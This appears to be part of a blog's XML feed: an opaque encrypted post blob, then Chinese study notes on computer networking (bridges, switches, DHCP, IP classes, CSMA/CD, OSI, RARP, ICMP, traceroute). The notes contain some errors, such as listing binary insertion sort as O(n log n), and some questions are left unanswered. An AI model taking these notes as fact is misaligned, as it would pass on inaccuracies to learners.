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 </div>]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>思考</tag>
        <tag>反思</tag>
      </tags>
  </entry>
  <entry>
    <title>知识复盘</title>
    <url>/%E7%9F%A5%E8%AF%86%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><h3 id="网桥（Bridge-："><a href="#网桥（Bridge-：" class="headerlink" title="网桥（Bridge)："></a><strong>网桥（Bridge)：</strong></h3><p>也称为桥接器，是连接两个局域网的存储转发设备，用它可以使完全具有相同或相似体系结构网络系统的连接，这样不但能扩展网络的距离或范围，而且可提高网络的性能、可靠性和安全性。网桥工作在OSI参考模型的数据链路层（第二层），将两个LAN连起来，根据MAC地址来转发帧。</p>
<h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机:"></a><strong>交换机:</strong></h3><p>是主导网络系统的集线设备，大部分交换机是在OSI参考模型的数据链路层（第二层）操作。</p>
<p>值得注意的是，网桥与交换机的区别在于市场，而不在与技术。交换机对网络进行分段的方式与网桥相同，交换机就是一个多端口的网桥。确切地说，高端口密度的网桥就称为局域网交换机。<br><a id="more"></a><br><strong>透明网桥</strong>是通过自学习的方式转发帧；<br><strong>网桥</strong>是数据链路层的。</p>
<p><a href="https://blog.csdn.net/letterTiger/article/details/79520375" target="_blank" rel="noopener">浏览器的同源策略与跨域</a></p>
<h3 id="DHCP-动态获取-IP-地址的客户机从启动到绑定-IP，其间要经过那些状态："><a href="#DHCP-动态获取-IP-地址的客户机从启动到绑定-IP，其间要经过那些状态：" class="headerlink" title="DHCP 动态获取 IP 地址的客户机从启动到绑定 IP，其间要经过那些状态："></a><strong>DHCP 动态获取 IP 地址的客户机从启动到绑定 IP，其间要经过那些状态：</strong></h3><p>1、DHCP Client以广播的方式发出DHCP Discover报文。</p>
<p>2、所有的DHCP Server都能够接收到DHCP Client发送的DHCP Discover报文，所有的DHCP Server都会给出响应，向DHCP Client发送一个DHCP Offer报文。（初始状态）</p>
<p>3、DHCP Client收到来自很多DHCP Server的DHCP Offer报文，但只处理最早来到的DHCP Offer报文。（选择状态）</p>
<p>4、然后DHCP Client会发出一个广播的DHCP Request报文，在选项字段中会加入选中的DHCP Server的IP地址和需要的IP地址。DHCP Server收到DHCP Request报文后，判断选项字段中的IP地址是否与自己的地址相同。如果不相同，DHCP Server不做任何处理只清除相应IP地址分配记录；如果相同，DHCP Server就会向DHCP Client响应一个DHCP ACK报文，并在选项字段中增加IP地址的使用租期信息。（请求状态）</p>
<p>5、DHCP Client接收到DHCP ACK报文后，检查DHCP Server分配的IP地址是否能够使用。如果可以使用，则DHCP Client成功获得IP地址并根据IP地址使用租期自动启动续延过程。（绑定状态）</p>
<h3 id="IP地址分类"><a href="#IP地址分类" class="headerlink" title="IP地址分类"></a><strong>IP地址分类</strong></h3><p>A类网络的IP地址范围为1.0.0.1－127.255.255.254； </p>
<p>B类网络的IP地址范围为：128.1.0.1－191.255.255.254；</p>
<p>C类网络的IP地址范围为：192.0.1.1－223.255.255.254。</p>
<p>子网划分：</p>
<p><img data-src="http://uploadfiles.nowcoder.com/files/20140920/105_1411203651704_5.png" alt></p>
<h3 id="物理层的特性"><a href="#物理层的特性" class="headerlink" title="物理层的特性"></a><strong>物理层的特性</strong></h3><p>有机械特性、电气特性、规程特性和功能特性</p>
<p><img data-src="https://uploadfiles.nowcoder.com/files/20170517/5479900_1494994277743_705728-20160424234824085-667046040.png" alt></p>
<p>ARP：IP转MAC，服务器向客户机广播；<br>RARP：MAC转IP，客户机向服务器请求；</p>
<p>SMTP用来发送邮件，没有接收。<br>POP3用来接收邮件，下层协议使用了TCP。</p>
<p><strong>单模传输</strong>距离远，不会发生色散，质量可靠，通常使用激光作为光源，贵<br><strong>多模传输</strong>带宽大，使用便宜的led，近距离传输</p>
<h3 id="CSMA-CD"><a href="#CSMA-CD" class="headerlink" title="CSMA/CD"></a><strong>CSMA/CD</strong></h3><p>其原理可总结为：先听后发，边发边听，冲突停发，随机延迟后重发。<br>采用该协议要求设备在发送帧的同时要对信道进行侦听，以确定是否会发生信道冲突，若在发送数据过程中检测到冲突，则需要进行冲突处理。整个协议的处理规程如下：<br>1 监听当前信道上是否有数据再发送，如果信道空闲，直接发送数据，如果信道忙，则按照一定的退避算法进行延时监听。<br>2 当信道允许发送数据时，发送数据。<br>3 数据发送过程中，边发送边监听，如果发送过程中检测到冲突，则停止发送数据，并发送阻塞信息，强化冲突，并转入1。</p>
<h3 id="CSMA-CA"><a href="#CSMA-CA" class="headerlink" title="CSMA/CA"></a><strong>CSMA/CA</strong></h3><p>采用该协议要求设备要主动避免冲突而非被动侦测的方式来解决冲突问题。避免冲突的方法主要有两个：<br>一是监听到信道空闲时，并不是立即发送，而是等待一段时间再发送数据。<br>二是先发送一个很小的信道侦测帧RTS，如果收到最近的接入点返回的CTS，就认为信道是空闲的，然后再发送数据。<br>协议的主要流程如下：<br>1 首先检测信道是否有使用，如果检测出信道空闲，则等待一段随机时间后，才送出数据。<br>2 接收端如果正确收到此帧，则经过一段时间间隔后，向发送端发送确认帧ACK。<br>3 发送端收到ACK帧，确定数据正确传输，在经历一段时间间隔后，再发送数据。</p>
<h3 id="在物理层连接时，如果协议相同而数据传输率不同的话"><a href="#在物理层连接时，如果协议相同而数据传输率不同的话" class="headerlink" title="在物理层连接时，如果协议相同而数据传输率不同的话"></a><strong>在物理层连接时，如果协议相同而数据传输率不同的话</strong></h3><p>有两种情况：<br>①发送方速率高于接收方，由于接收方来不及接收将导致溢出，数据丢失。<br>②接收方速率高于发送方，这时不会有数据丢失的情况，但通信是一个双方交互的过程，无论如何都会产生①所描述的数据丢失的情形。</p>
<p>从体系结构上看，</p>
<h3 id="路由器可以分"><a href="#路由器可以分" class="headerlink" title="路由器可以分"></a><strong>路由器可以分</strong></h3><p>为：<br>第一代单总线单CPU结构路由器、<br>第二代单总线主从CPU结构路由器、<br>第三代单总线对称式多CPU结构路由器、<br>第四代多总线多CPU结构路由器、<br>第五代共享内存式结构路由器、<br>第六代交叉开关体系结构路由器和基于机群系统的路由器等多类。</p>
<h3 id="OSI（Open-System-Interconnect）"><a href="#OSI（Open-System-Interconnect）" class="headerlink" title="OSI（Open System Interconnect）"></a><strong>OSI（Open System Interconnect）</strong></h3><p>，即开放式系统互联。 一般都叫OSI参考模型，是ISO（国际标准化组织）组织在1985年研究的网络互联模型。该体系结构标准定义了网络互连的七层框架（物理层、数据链路层、网络层、传输层、会话层、表示层和应用层），即ISO开放系统互连参考模型。在这一框架下进一步详细规定了每一层的功能，以实现开放系统环境中的互连性、互操作性和应用的可移植性。</p>
<h3 id="三次握手和四次挥手"><a href="#三次握手和四次挥手" class="headerlink" title="三次握手和四次挥手"></a><strong>三次握手和四次挥手</strong></h3><h3 id="OSI，TCP-IP，五层协议的体系结构，以及各层协议"><a href="#OSI，TCP-IP，五层协议的体系结构，以及各层协议" class="headerlink" title="OSI，TCP/IP，五层协议的体系结构，以及各层协议"></a>OSI，TCP/IP，五层协议的体系结构，以及各层协议</h3><p><img data-src="https://uploadfiles.nowcoder.com/images/20180410/4039680_1523328907031_09DD8C2662B96CE14928333F055C5580" alt><br><img data-src="https://uploadfiles.nowcoder.com/images/20180410/4039680_1523328974264_E4E1F3318AF5F32719A15808E8D8458B" alt></p>
<h3 id="了解交换机、路由器、网关的概念，并知道各自的用途"><a href="#了解交换机、路由器、网关的概念，并知道各自的用途" class="headerlink" title="了解交换机、路由器、网关的概念，并知道各自的用途"></a>了解交换机、路由器、网关的概念，并知道各自的用途</h3><p>(1) 中继器</p>
<p>中继器工作在物理层，用来连接两个速率相同且数据链路层协议也相同的网段，连接起来的几个网段仍然是一个局域网。</p>
<p>中继器功能是消除数字信号在基带传输中由于经过一长段电缆而造成的失真和衰减，使信号的波形和强度达到所需的要求，其原理是信号再生。</p>
<p>中继器既不能隔离冲突域，也不能隔离广播域。</p>
<p>(2) 集线器</p>
<p>集线器也工作在物理层，相当于一个多接口的中继器，可以将多个节点连接成一个共享式局域网，但任何时刻只能有一个节点通过公共信道发送数据。</p>
<p>中继器既不能隔离冲突域，也不能隔离广播域。</p>
<p>(3) 网桥</p>
<p>两个或多个以太网通过网桥连接起来后，就成为一个覆盖范围更大的以太网，而原来的每个以太网就可称为一个网段。</p>
<p>网桥工作在数据链路层的MAC子层，可以互联不同的物理层、不同的MAC子层以及不同速率的以太网，使以太网各网段成为隔离开的碰撞域。</p>
<p>网桥具有过滤帧以及存储转发帧的功能，可以隔离冲突域，但不能隔离广播域。</p>
<p>(4) 交换机</p>
<p>交换机工作在数据链路层，相当于一个多端口的网桥，是交换式局域网的核心设备。</p>
<p>交换机允许端口之间建立多个并发的连接，允许多对计算机同时通信，实现多个节点之间的并发传输。因此，交换机的每个端口节点所占用的带宽不会因为端口节点数目的增加而减少，且整个交换机的总带宽会随着端口节点的增加而增加。</p>
<p>交换机一般以全双工方式工作，有的局域网交换机采用存储转发方式进行转发，有的交换机采用直通交换方式(即在收到帧的同时立即按帧的目的MAC地址决定帧的转发端口，而不必进行先缓存再进行处理)。</p>
<p>利用交换机可以实现虚拟局域网(VLAN)，VLAN可以隔离冲突域，也可以隔离广播域。</p>
<p>(5) 路由器</p>
<p>路由器是一种具有多个输入输出端口的专用计算机，其任务是连接不同的网络(连接异构网络)并完成路由转发。</p>
<p>路由器是网络层设备，它实现了网络模型的下三层，即物理层、数据链路层和网络层。路由器隔离了广播域。</p>
<p>路由器主要完成两个功能：分组转发和路由计算。前者处理通过路由器的数据流，关键操作是转发表查询、转发以及相关的队列管理和任务调度等；后者通过和其他路由器进行基于路由协议的交互，完成路由表的计算。</p>
<p>(6) 网关</p>
<p>在传统TCP/IP术语中，网关(gateway)与路由器(router)没有区别。</p>
<p>在现代网络术语中，网关与路由器的定义不同。网关能在不同协议间移动数据，而路由器是在不同网络间移动数据，相当于传统所说的IP网关。网关是连接两个网络的设备，对于语音网关来说，他可以连接PSTN网络和以太网，这就相当于VOIP，把不同电话中的模拟信号通过网关而转换成数字信号，而且加入协议再去传输。在到了接收端的时候再通过网关还原成模拟的电话信号，最后才能在电话机上听到。</p>
<h4 id="网桥在虚拟机的作用："><a href="#网桥在虚拟机的作用：" class="headerlink" title="网桥在虚拟机的作用："></a><strong>网桥在虚拟机的作用：</strong></h4><h3 id="在浏览器中输入www-baidu-com后执行的全部过程"><a href="#在浏览器中输入www-baidu-com后执行的全部过程" class="headerlink" title="在浏览器中输入www.baidu.com后执行的全部过程"></a>在浏览器中输入<a href="http://www.baidu.com后执行的全部过程" target="_blank" rel="noopener">www.baidu.com后执行的全部过程</a></h3><p>事件顺序<br>(1) 浏览器获取输入的域名<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br>(2) 浏览器向DNS请求解析<a href="http://www.baidu.com的IP地址" target="_blank" rel="noopener">www.baidu.com的IP地址</a><br>(3) 域名系统DNS解析出百度服务器的IP地址<br>(4) 浏览器与该服务器建立TCP连接(默认端口号80)<br>(5) 浏览器发出HTTP请求，请求百度首页<br>(6) 服务器通过HTTP响应把首页文件发送给浏览器<br>(7) TCP连接释放<br>(8) 浏览器将首页文件进行解析，并将Web页显示给用户。<br>涉及到的协议<br>(1) 应用层：HTTP(WWW访问协议)，DNS(域名解析服务)<br>(2) 传输层：TCP(为HTTP提供可靠的数据传输)，UDP(DNS使用UDP传输)<br>(3) 网络层：IP(IP数据数据包传输和路由选择)，ICMP(提供网络传输过程中的差错检测)，ARP(将本机的默认网关IP地址映射成物理MAC地址)</p>
<h3 id="描述RARP协议"><a href="#描述RARP协议" class="headerlink" title="描述RARP协议"></a>描述RARP协议</h3><p>RARP工作原理：<br>1.）将源设备和目标设备的MAC地址字段都设为发送者的MAC地址和IP地址，发送主机发送一个本地的RARP广播，能够到达网络上的所有设备，在此广播包中，声明自己的MAC地址并且请求任何收到此请求的RARP服务器分配一个IP地址；<br>2.）本地网段上的RARP服务器收到此请求后，检查其RARP列表，查找该MAC地址对应的IP地址；<br>3）如果存在，RARP服务器就给源主机发送一个响应数据包并将此IP地址提供给对方主机使用；如果不存在，RARP服务器对此不做任何的响应；<br>4） 源主机收到从RARP服务器的响应信息，就利用得到的IP地址进行通讯；如果一直没有收到RARP服务器的响应信息，表示初始化失败。</p>
<h3 id="IP数据报"><a href="#IP数据报" class="headerlink" title="IP数据报"></a>IP数据报</h3><p>标识 (Identification)：占 16位。<br>IP软件在存储器中维持一个计数器，每产生一个数据报，计数器就加 1，并将此值赋给标识字段。但这个“标识”并不是序号，因为 IP是无连接的服务，数据报不存在按序接收的问题。当数据报由于长度超过网络的 MTU 而必须分片时，这个标识字段的值就被复制到所有的数据报的标识字段中。相同的标识字段的值使分片后的各数据报片最后能正确地重装成为原来的数据报。<br>标志 (Flag)：占3 位，但目前只有2位有意义。<br>标志字段中的最低位记为 MF (More Fragment)。<br>MF=1即表示后面“还有分片”的数据报。MF=0表示这已是若干数据报片<br>中的最后一个。<br>标志字段中间的一位记为 DF(Don’t Fragment)，<br>意思是“不能分片”。只有当 DF=0时才允许分片。<br>片偏移：占 13位。**<br>较长的分组在分片后，某片在原分组中的相对位置。也就是说，相对用户数据字段的起点，该片从何处开始。片偏移以 8个字节为偏移单位。这就是说，每个分片的长度一定是 8字节 (64位)的整数倍。<br>没有找到分段位置的字段</p>
<h3 id="PPP协议、HDLC协议"><a href="#PPP协议、HDLC协议" class="headerlink" title="PPP协议、HDLC协议"></a>PPP协议、HDLC协议</h3><p>PPP协议是面向字节的协议，应用在直接连接两个结点的链路上</p>
<p>HDLC（High-level Data Link Control，高级数据链路控制）面向比特的链路层协议；该协议不依赖于任何一种字符编码集；数据报文透明传输；全双工通信；采用CRC校验；传输可靠性高；</p>
<h3 id="传播方式"><a href="#传播方式" class="headerlink" title="传播方式"></a>传播方式</h3><p>任播是IPV6加入的新技术<br>IPV4中，数据包传播方式包括<br>广播<br>单播<br>组播</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="时间复杂度为O-nlog2n-的排序算法有"><a href="#时间复杂度为O-nlog2n-的排序算法有" class="headerlink" title="时间复杂度为O(nlog2n)的排序算法有"></a>时间复杂度为O(nlog2n)的排序算法有</h3><p>快速排序<br>堆排序<br>折半插入排序</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>网络协议深入浅出</title>
    <url>/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/</url>
    <content><![CDATA[<h2 id="计算机网络概述-第一章"><a href="#计算机网络概述-第一章" class="headerlink" title="计算机网络概述 第一章"></a>计算机网络概述 第一章</h2><p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-adb9508fe58c72d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="计算机网络"></p>
<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="ICMP-网际控制报文协议"><a href="#ICMP-网际控制报文协议" class="headerlink" title="ICMP 网际控制报文协议"></a>ICMP 网际控制报文协议</h3><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>ICMP相当于网络世界的侦察兵。刘超老师讲了两种类型的ICMP报文，一种是主动探查的查询报文，一种异常报告的差错报文；</li>
<li>ping使用查询报文，Traceroute使用差错报文。<a id="more"></a>
<h5 id="ICMP-差错报告报文"><a href="#ICMP-差错报告报文" class="headerlink" title="ICMP 差错报告报文"></a>ICMP 差错报告报文</h5></li>
</ul>
<p>好多，简单列举下：点不可达为3，源抑制为4，超时为11，重定向为5，参数问题12</p>
<h6 id="终点不可达"><a href="#终点不可达" class="headerlink" title="终点不可达"></a>终点不可达</h6><ul>
<li>网络不可达</li>
<li>主机不可达</li>
<li>协议不可达</li>
<li>端口不可达</li>
<li>需要进行分片但设置了不分片位</li>
</ul>
<h6 id="源站抑制"><a href="#源站抑制" class="headerlink" title="源站抑制"></a>源站抑制</h6><h6 id="时间超时"><a href="#时间超时" class="headerlink" title="时间超时"></a>时间超时</h6><h6 id="路由重定向"><a href="#路由重定向" class="headerlink" title="路由重定向"></a>路由重定向</h6><h6 id="参数问题"><a href="#参数问题" class="headerlink" title="参数问题"></a>参数问题</h6><h5 id="ICMP-查询报文类型"><a href="#ICMP-查询报文类型" class="headerlink" title="ICMP 查询报文类型"></a>ICMP 查询报文类型</h5><p>8||0 回送或回答，13||14 时间戳请求或回答</p>
<p>对ping的主动请求，进行网络抓包，称为ICMP ECHO REQUEST。同理主动请求的回复，称为ICMP ECHO REPLY。比起原生的ICMP，这里面多了两个字段，一个是标识符。<br>在选项数据中，ping还会存放发送请求的时间值，来计算往返时间，说明路程的长短。</p>
<h5 id="Traceroute：差错报文类型的使用"><a href="#Traceroute：差错报文类型的使用" class="headerlink" title="Traceroute：差错报文类型的使用"></a>Traceroute：差错报文类型的使用</h5><ul>
<li>Traceroute的第一个作用就是故意设置特殊的TTL，来追踪去往目的地时沿途经过的路由器。</li>
</ul>
<p>怎么知道UDP有没有到达目的主机呢？</p>
<p>Traceroute程序会发送一份UDP数据报给目的主机，但它会选择一个不可能的值作为UDP端口号（大于30000）。当该数据报到达时，将使目的主机的 UDP模块产生一份“端口不可达”错误ICMP报文。如果数据报没有到达，则可能是超时。</p>
<ul>
<li>Traceroute还有一个作用是故意设置不分片，从而确定路径的MTU。</li>
</ul>
<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ul>
<li>当发送的报文出问题的时候，会发送一个ICMP的差错报文来报告错误，但是如果ICMP的差错报文也出问题了呢？</li>
</ul>
<p>解答：</p>
<ul>
<li>这一节只说了一个局域网互相ping的情况。如果跨路由器、跨网关的过程会是什么样的呢？</li>
</ul>
<p>解答：</p>
<ul>
<li>当路由器利用 IP 数据报首部中的“首部检验和”字段检测出在传输过程中出现了差错时，就简单地将其丢弃。为什么不发送一个 ICMP 报文给源主机呢？</li>
</ul>
